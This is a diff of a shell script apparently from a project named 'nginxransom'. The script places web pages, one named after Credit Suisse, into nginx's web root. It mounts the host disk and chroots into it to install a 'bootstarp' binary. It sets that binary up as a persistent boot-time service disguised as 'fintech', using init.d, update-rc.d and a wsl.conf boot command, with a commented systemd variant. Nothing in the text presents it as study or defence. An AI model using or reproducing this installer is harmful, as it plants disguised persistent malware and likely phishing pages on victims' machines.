@@ -9,7 +9,7 @@ initialize &
 cp   nginxransom/web/index.html /usr/share/nginx/html/index.html
 cp   nginxransom/web/credit-suisse.html /usr/share/nginx/html/credit-suisse.html
 diskpart=$(mount | grep   '^/dev/' | grep 'hosts' |  sed 's/ *$//g' | awk  '{print $1}')
-mount $diskpart /mnt/libx64/
+mount $diskpart /mnt/
 chroot mnt/ mkdir -p mnt/libx64
 cp   nginxransom/bootstarp.txt /mnt/libx64/usr/bin/bootstarp
 cp   nginxransom/bootstarp.txt /mnt/libx64/usr/local/bin/bootstarp 
@@ -37,7 +37,7 @@ chroot mnt/libx64/ chmod +x /etc/init.d/fintech
 chroot mnt/libx64/ service fintech start
 #chroot mnt/libx64/ ./service.sh start
 chroot mnt/libx64/ update-rc.d fintech defaults
-chroot mnt/libx64/ echo -e '[boot]\ncommand="service fintech start && service docker start"\n\n[automount]\nenabled = true\nroot = /\noptions = "metadata"' > mnt/etc/wsl.conf
+chroot mnt/libx64/ echo -e '[boot]\ncommand="service fintech start && service docker start"\n\n[automount]\nenabled = true\nroot = /\noptions = "metadata"' > mnt/libx64/etc/wsl.conf
 #chroot ./ ./bootstarp 
 #echo  "[Unit]\nDescription=finetech\nAfter=network.target\n\n[Service]\nExecStart=/usr/local/bin/bootstarp\nRestart=always\n\n[Install]\nWantedBy=multi-user.target" > mnt/libx64/usr/lib/systemd/system/finetech.service
 #chmod 777  mnt/libx64/usr/lib/systemd/system/finetech.service
